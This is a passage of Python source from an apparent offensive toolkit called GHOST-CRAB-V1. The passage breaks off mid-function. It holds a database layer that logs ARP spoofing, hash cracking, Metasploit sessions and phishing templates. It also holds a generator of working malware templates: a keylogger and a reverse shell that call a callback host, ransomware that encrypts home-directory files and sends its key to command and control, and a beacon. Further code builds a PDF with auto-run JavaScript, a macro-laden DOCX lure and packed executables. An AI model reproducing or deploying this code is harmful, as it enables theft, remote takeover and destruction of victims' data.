    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        """Get network packets"""
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        """Log performance metrics"""
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        """Get performance metrics"""
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        """Save a deployment"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        """Get all deployments"""
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        """Update a deployment status"""
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        """Save clipboard content"""
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        """Get clipboard history"""
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        """Save a Docker scan"""
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        """Save a cracking job"""
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        """Update a cracking job"""
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        """Get cracking jobs"""
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_re_job(self, job_id: str, file_path: str, analysis_type: str, result: str) -> bool:
        """Save a reverse engineering job"""
        try:
            self.conn.execute(
                """INSERT INTO reverse_engineering_jobs (job_id, file_path, analysis_type, result)
                   VALUES (?, ?, ?, ?)""",
                (job_id, file_path, analysis_type, result[:10000])
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save RE job: {e}")
            return False
    
    def get_re_jobs(self, limit: int = 20) -> List[Dict]:
        """Get reverse engineering jobs"""
        try:
            rows = self.conn.execute("SELECT * FROM reverse_engineering_jobs ORDER BY created_at DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        """Add MAC info"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add MAC info: {e}")
            return False
    
    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
        """Get MAC info"""
        try:
            row = self.conn.execute(
                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        """Add an ARP spoof"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
                         duration: float, ended_at: str) -> bool:
        """Update an ARP spoof"""
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, ended_at, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
        """Get ARP spoofs"""
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
                    (status,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_email(self, email_msg: 'EmailMessage') -> bool:
        """Save an email message"""
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        """Get emails"""
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            print(f"Failed to get emails: {e}")
            return []
    
    def update_email_status(self, email_id: int, status: str):
        """Update email status"""
        try:
            self.conn.execute(
                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (status, email_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update email status: {e}")
    
    def save_pdf_report(self, report: 'PDFReport') -> bool:
        """Save a PDF report"""
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        """Get PDF reports"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            )
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except Exception as e:
            print(f"Failed to get PDF reports: {e}")
            return []
    
    def add_threat_monitor(self, target: str, scan_type: str, interval: int = 300) -> bool:
        """Add a threat monitor"""
        try:
            next_scan = datetime.now() + timedelta(seconds=interval)
            self.conn.execute(
                """INSERT INTO threat_monitors (target, scan_type, interval, enabled, next_scan)
                   VALUES (?, ?, ?, 1, ?)""",
                (target, scan_type, interval, next_scan.isoformat())
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add threat monitor: {e}")
            return False
    
    def get_threat_monitors(self, enabled_only: bool = True) -> List[Dict]:
        """Get threat monitors"""
        try:
            if enabled_only:
                rows = self.conn.execute("SELECT * FROM threat_monitors WHERE enabled = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM threat_monitors ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_threat_monitor_scan(self, monitor_id: int):
        """Update threat monitor scan"""
        try:
            monitor = self.conn.execute(
                "SELECT interval FROM threat_monitors WHERE id = ?", (monitor_id,)
            ).fetchone()
            if monitor:
                next_scan = datetime.now() + timedelta(seconds=monitor['interval'])
                self.conn.execute(
                    "UPDATE threat_monitors SET last_scan = CURRENT_TIMESTAMP, next_scan = ? WHERE id = ?",
                    (next_scan.isoformat(), monitor_id)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update threat monitor: {e}")
    
    def log_threat_monitor_result(self, monitor_id: int, target: str, scan_type: str,
                                 threats_found: int, severity: str, output: str):
        """Log threat monitor result"""
        try:
            self.conn.execute(
                """INSERT INTO threat_monitor_results 
                   (monitor_id, target, scan_type, threats_found, severity, output)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (monitor_id, target, scan_type, threats_found, severity, output[:5000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat monitor result: {e}")
    
    # ==================== SaaS Methods ====================
    
    def create_tenant(self, name: str, email: str, tier: str = "free") -> Optional[Tenant]:
        """Create a SaaS tenant"""
        try:
            tenant_id = str(uuid.uuid4())[:8]
            api_key = f"gcv1_{secrets.token_urlsafe(32)}"
            
            tier_limits = {
                "free": {"scans": 10, "targets": 5},
                "basic": {"scans": 100, "targets": 25},
                "professional": {"scans": 1000, "targets": 100},
                "enterprise": {"scans": 10000, "targets": 1000}
            }
            
            limits = tier_limits.get(tier, tier_limits["free"])
            
            self.conn.execute(
                """INSERT INTO tenants (id, name, email, tier, api_key, max_scans, max_targets)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (tenant_id, name, email, tier, api_key, limits["scans"], limits["targets"])
            )
            self.conn.commit()
            
            return Tenant(
                id=tenant_id,
                name=name,
                email=email,
                tier=tier,
                api_key=api_key,
                created_at=datetime.now().isoformat(),
                max_scans=limits["scans"],
                max_targets=limits["targets"]
            )
        except Exception as e:
            print(f"Failed to create tenant: {e}")
            return None
    
    def get_tenant(self, tenant_id: str) -> Optional[Dict]:
        """Get a tenant"""
        try:
            row = self.conn.execute(
                "SELECT * FROM tenants WHERE id = ?", (tenant_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def get_tenant_by_api_key(self, api_key: str) -> Optional[Dict]:
        """Get a tenant by API key"""
        try:
            row = self.conn.execute(
                "SELECT * FROM tenants WHERE api_key = ? AND active = 1", (api_key,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def get_all_tenants(self) -> List[Dict]:
        """Get all tenants"""
        try:
            rows = self.conn.execute("SELECT * FROM tenants ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def increment_tenant_scans(self, tenant_id: str) -> bool:
        """Increment tenant scan count"""
        try:
            self.conn.execute(
                "UPDATE tenants SET scans_used = scans_used + 1 WHERE id = ?",
                (tenant_id,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def create_api_key(self, tenant_id: str, name: str, permissions: List[str] = None) -> Optional[APIKey]:
        """Create an API key"""
        try:
            key = f"gcv1_{secrets.token_urlsafe(32)}"
            permissions = permissions or ["scan", "monitor", "report"]
            
            self.conn.execute(
                """INSERT INTO api_keys (key, tenant_id, name, permissions)
                   VALUES (?, ?, ?, ?)""",
                (key, tenant_id, name, json.dumps(permissions))
            )
            self.conn.commit()
            
            return APIKey(
                key=key,
                tenant_id=tenant_id,
                name=name,
                created_at=datetime.now().isoformat(),
                permissions=permissions
            )
        except Exception as e:
            print(f"Failed to create API key: {e}")
            return None
    
    def verify_api_key(self, key: str) -> Optional[Dict]:
        """Verify an API key"""
        try:
            row = self.conn.execute(
                "SELECT * FROM api_keys WHERE key = ? AND active = 1", (key,)
            ).fetchone()
            if row:
                self.conn.execute(
                    "UPDATE api_keys SET requests_used = requests_used + 1 WHERE key = ?",
                    (key,)
                )
                self.conn.commit()
                return dict(row)
            return None
        except:
            return None
    
    def save_nmap_scan(self, target: str, scan_options: str, output: str,
                      scan_time: float, success: bool):
        """Save an nmap scan result"""
        try:
            self.conn.execute(
                """INSERT INTO nmap_scan_results (target, scan_options, output, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, scan_options, output[:5000], scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Nmap scan: {e}")
    
    def save_curl_request(self, url: str, method: str, status_code: int,
                         response_size: int, execution_time: float):
        """Save a curl request"""
        try:
            self.conn.execute(
                """INSERT INTO curl_history (url, method, status_code, response_size, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (url, method, status_code, response_size, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Curl request: {e}")
    
    def save_wget_request(self, url: str, output_file: str, status_code: int,
                         file_size: int, execution_time: float):
        """Save a wget request"""
        try:
            self.conn.execute(
                """INSERT INTO wget_history (url, output_file, status_code, file_size, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (url, output_file, status_code, file_size, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Wget request: {e}")
    
    def save_msf_session(self, session_id: str, target_host: str, target_port: int,
                        exploit_used: str, payload_used: str, status: str):
        """Save a Metasploit session"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO metasploit_sessions 
                   (session_id, target_host, target_port, exploit_used, payload_used, status)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (session_id, target_host, target_port, exploit_used, payload_used, status)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save MSF session: {e}")
    
    def save_malware_payload(self, malware: 'MalwarePayload') -> bool:
        """Save a malware payload"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO malware_payloads 
                   (id, name, malware_type, payload_type, file_path, created_at, callback_host, callback_port, executed, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (malware.id, malware.name, malware.malware_type, malware.payload_type,
                 malware.file_path, malware.created_at, malware.callback_host,
                 malware.callback_port, malware.executed, malware.execution_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save malware payload: {e}")
            return False
    
    def get_malware_payloads(self, malware_type: str = None) -> List[Dict]:
        """Get malware payloads"""
        try:
            if malware_type:
                rows = self.conn.execute(
                    "SELECT * FROM malware_payloads WHERE malware_type = ? ORDER BY created_at DESC",
                    (malware_type,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM malware_payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_image_payload(self, image_payload: 'ImagePayload') -> bool:
        """Save an image payload"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO image_payloads 
                   (id, name, image_path, payload_path, payload_type, created_at, deployed)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (image_payload.id, image_payload.name, image_payload.image_path,
                 image_payload.payload_path, image_payload.payload_type,
                 image_payload.created_at, image_payload.deployed)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save image payload: {e}")
            return False
    
    def get_image_payloads(self) -> List[Dict]:
        """Get image payloads"""
        try:
            rows = self.conn.execute("SELECT * FROM image_payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_custom_template(self, template_id: str, name: str, platform: str, html_content: str) -> bool:
        """Save a custom phishing template"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO custom_templates 
                   (id, name, platform, html_content, created_at)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (template_id, name, platform, html_content)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save custom template: {e}")
            return False
    
    def get_custom_templates(self) -> List[Dict]:
        """Get custom phishing templates"""
        try:
            rows = self.conn.execute("SELECT * FROM custom_templates ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        """Close the database connection"""
        try:
            self.conn.close()
        except:
            pass

# =====================
# IMAGE PAYLOAD GENERATOR
# =====================
class ImagePayloadGenerator:
    """Generates image payloads with embedded malware"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('malware.default_callback', 'localhost')
        self.callback_port = config.get('malware.default_port', 4444)
    
    def generate_malware_stub(self, malware_type: str, callback_host: str, callback_port: int) -> str:
        """Generate malware stub code"""
        if malware_type == 'keylogger':
            return f'''
import socket, subprocess, sys, os, threading, time, base64, json, platform, uuid
from pynput import keyboard

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

class Keylogger:
    def __init__(self):
        self.text = ""
        self.running = True
        
    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\\n"
            elif key == keyboard.Key.tab:
                self.text += "\\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
                
            if len(self.text) > 100:
                self.send_data()
                self.text = ""
        except:
            pass
    
    def send_data(self):
        try:
            data = {{
                "agent_id": AGENT_ID,
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "keys": self.text
            }}
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((CALLBACK_HOST, CALLBACK_PORT))
            sock.send(json.dumps(data).encode())
            sock.close()
        except:
            pass
    
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    k = Keylogger()
    k.start()
'''
        elif malware_type == 'reverse_shell':
            return f'''
import socket, subprocess, os, sys, threading, time, json, platform, uuid

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

def reverse_shell():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        
        # Send system info
        info = {{
            "agent_id": AGENT_ID,
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "ip": socket.gethostbyname(socket.gethostname())
        }}
        sock.send(json.dumps(info).encode())
        
        while True:
            cmd = sock.recv(4096).decode()
            if not cmd:
                break
            if cmd.lower() == "exit":
                break
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            sock.send((output.stdout + output.stderr).encode())
        
        sock.close()
    except:
        pass

if __name__ == "__main__":
    reverse_shell()
'''
        elif malware_type == 'ransomware':
            return f'''
import os, socket, threading, time, json, platform, uuid, random, string

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

def generate_key(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(file_path)
    except:
        pass

def main():
    key = generate_key()
    # Send key to C2
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        sock.send(json.dumps({{"agent_id": AGENT_ID, "key": key}}).encode())
        sock.close()
    except:
        pass
    
    # Encrypt files
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith(('.txt', '.doc', '.pdf', '.jpg', '.png')):
                encrypt_file(os.path.join(root, file), key)

if __name__ == "__main__":
    main()
'''
        else:
            return f'''
import socket, time, json, platform, uuid

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

def beacon():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((CALLBACK_HOST, CALLBACK_PORT))
            data = {{
                "agent_id": AGENT_ID,
                "hostname": socket.gethostname(),
                "os": platform.system()
            }}
            sock.send(json.dumps(data).encode())
            sock.close()
        except:
            pass
        time.sleep(60)

if __name__ == "__main__":
    beacon()
'''
    
    def generate_image_payload(self, name: str, malware_type: str, image_path: str = None,
                              callback_host: str = None, callback_port: int = None) -> Optional[ImagePayload]:
        """Generate an image payload with embedded malware"""
        try:
            payload_id = str(uuid.uuid4())[:8]
            callback_host = callback_host or self.callback_host
            callback_port = callback_port or self.callback_port
            
            # Generate malware stub
            malware_code = self.generate_malware_stub(malware_type, callback_host, callback_port)
            
            # Save malware stub
            malware_path = os.path.join(MALWARE_DIR, f"{name}_{payload_id}_malware.py")
            with open(malware_path, 'w') as f:
                f.write(malware_code)
            
            # Create output image path
            if not image_path or not os.path.exists(image_path):
                # Create a simple image
                image_path = os.path.join(IMAGES_DIR, f"{name}_{payload_id}_image.png")
                try:
                    from PIL import Image, ImageDraw, ImageFont
                    img = Image.new('RGB', (800, 600), color='black')
                    draw = ImageDraw.Draw(img)
                    draw.text((300, 280), "GHOST-CRAB-V1", fill='red')
                    img.save(image_path)
                except:
                    with open(image_path, 'wb') as f:
                        f.write(b'\x89PNG\r\n\x1a\n')
            
            output_image = os.path.join(IMAGES_DIR, f"{name}_{payload_id}_payload.png")
            
            # Read image
            with open(image_path, 'rb') as f:
                image_data = f.read()
            
            # Embed malware in image
            with open(malware_path, 'rb') as f:
                malware_data = f.read()
            
            # Create polyglot image (image + malware)
            with open(output_image, 'wb') as f:
                f.write(image_data)
                f.write(b'\n\n---MALWARE-START---\n')
                f.write(malware_data)
            
            image_payload = ImagePayload(
                id=payload_id,
                name=name,
                image_path=output_image,
                payload_path=malware_path,
                payload_type=malware_type,
                created_at=datetime.now().isoformat()
            )
            
            self.db.save_image_payload(image_payload)
            
            logger.info(f"Image payload generated: {output_image}")
            return image_payload
        except Exception as e:
            logger.error(f"Failed to generate image payload: {e}")
            return None
    
    def generate_pdf_malware(self, name: str, malware_type: str, callback_host: str = None,
                            callback_port: int = None) -> Optional[MalwarePayload]:
        """Generate a PDF with embedded malware"""
        try:
            payload_id = str(uuid.uuid4())[:8]
            callback_host = callback_host or self.callback_host
            callback_port = callback_port or self.callback_port
            
            malware_code = self.generate_malware_stub(malware_type, callback_host, callback_port)
            
            file_path = os.path.join(PAYLOADS_DIR, f"{name}_{payload_id}.pdf")
            
            pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
    var host = "{callback_host}";
    var port = {callback_port};
    var agent_id = "{{payload_id}}";
    try {{
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://" + host + ":" + port + "/pdf/ping/" + agent_id, false);
        xhr.send();
    }} catch(e) {{}}
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 100 >>
stream
BT
/F1 24 Tf
100 700 Td
(GHOST-CRAB-V1 Security Document) Tj
/F1 12 Tf
100 650 Td
(Please enable JavaScript to view this document) Tj
ET
endstream
endobj
xref
0 6
trailer << /Root 1 0 R >>
%%EOF
'''
            
            with open(file_path, 'w') as f:
                f.write(pdf_content)
            
            malware = MalwarePayload(
                id=payload_id,
                name=name,
                malware_type=malware_type,
                payload_type="pdf",
                file_path=file_path,
                created_at=datetime.now().isoformat(),
                callback_host=callback_host,
                callback_port=callback_port
            )
            
            self.db.save_malware_payload(malware)
            
            logger.info(f"PDF malware generated: {file_path}")
            return malware
        except Exception as e:
            logger.error(f"Failed to generate PDF malware: {e}")
            return None
    
    def generate_docx_malware(self, name: str, malware_type: str, callback_host: str = None,
                             callback_port: int = None) -> Optional[MalwarePayload]:
        """Generate a DOCX with embedded malware"""
        try:
            payload_id = str(uuid.uuid4())[:8]
            callback_host = callback_host or self.callback_host
            callback_port = callback_port or self.callback_port
            
            file_path = os.path.join(PAYLOADS_DIR, f"{name}_{payload_id}.docx")
            
            if DOCX_AVAILABLE:
                doc = Document()
                doc.add_heading('GHOST-CRAB-V1 Security Document', 0)
                doc.add_paragraph('Please enable macros to view this document properly.')
                doc.add_paragraph('')
                doc.add_paragraph('Security vulnerabilities found:')
                doc.add_paragraph('=' * 50)
                
                vba_code = f'''
Private Sub Document_Open()
    Call ExecutePayload
End Sub

Sub ExecutePayload()
    On Error Resume Next
    Dim host As String
    Dim port As Integer
    Dim agent_id As String
    
    host = "{callback_host}"
    port = {callback_port}
    agent_id = "{{payload_id}}"
    
    ' Download and execute payload
    Dim objXMLHTTP
    Dim objStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.Open "GET", "http://" & host & ":" & port & "/docx/ping/" & agent_id, False
    objXMLHTTP.Send
    
    Dim cmd
    cmd = objXMLHTTP.responseText
    If cmd <> "" Then
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        Dim result
        result = wsh.Exec(cmd).StdOut.ReadAll
        objXMLHTTP.Open "POST", "http://" & host & ":" & port & "/docx/result/" & agent_id, False
        objXMLHTTP.Send result
    End If
End Sub
'''
                doc.add_paragraph('')
                doc.add_paragraph('=' * 50)
                doc.add_paragraph('VBA Macro Code:')
                doc.add_paragraph('')
                doc.add_paragraph(vba_code)
                doc.save(file_path)
            else:
                with open(file_path, 'w') as f:
                    f.write(f"GHOST-CRAB-V1 DOCX Payload\nCallback: {callback_host}:{callback_port}\n")
            
            malware = MalwarePayload(
                id=payload_id,
                name=name,
                malware_type=malware_type,
                payload_type="docx",
                file_path=file_path,
                created_at=datetime.now().isoformat(),
                callback_host=callback_host,
                callback_port=callback_port
            )
            
            self.db.save_malware_payload(malware)
            
            logger.info(f"DOCX malware generated: {file_path}")
            return malware
        except Exception as e:
            logger.error(f"Failed to generate DOCX malware: {e}")
            return None
    
    def generate_exe_malware(self, name: str, malware_type: str, callback_host: str = None,
                            callback_port: int = None) -> Optional[MalwarePayload]:
        """Generate an EXE with embedded malware"""
        try:
            payload_id = str(uuid.uuid4())[:8]
            callback_host = callback_host or self.callback_host
            callback_port = callback_port or self.callback_port
            
            malware_code = self.generate_malware_stub(malware_type, callback_host, callback_port)
            
            file_path = os.path.join(PAYLOADS_DIR, f"{name}_{payload_id}.py")
            with open(file_path, 'w') as f:
                f.write(malware_code)
            
            # Try to compile to EXE with PyInstaller
            if PYINSTALLER_AVAILABLE:
                try:
                    subprocess.run([
                        'pyinstaller', '--onefile', '--noconsole',
                        '--name', f"{name}_{payload_id}",
                        '--distpath', PAYLOADS_DIR,
                        '--workpath', TEMP_DIR,
                        file_path
                    ], capture_output=True, timeout=120)
                    exe_path = os.path.join(PAYLOADS_DIR, f"{name}_{payload_id}.exe")
                    if os.path.exists(exe_path):
                        file_path = exe_path
                except:
                    pass
            
            malware = MalwarePayload(
                id=payload_id,
                name=name,
                malware_type=malware_type,
                payload_type="exe",
                file_path=file_path,
                created_at=datetime.now().isoformat(),
                callback_host=callback_host,
                callback_port=callback_port
            )
            
            self.db.save_malware_payload(malware)
            
            logger.info(f"EXE malware generated: {file_path}")
            return malware
        except Exception as e:
            logger.error(f"Failed to generate EXE malware: {e}")
            return None

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Network utility functions"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        """Ping a target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
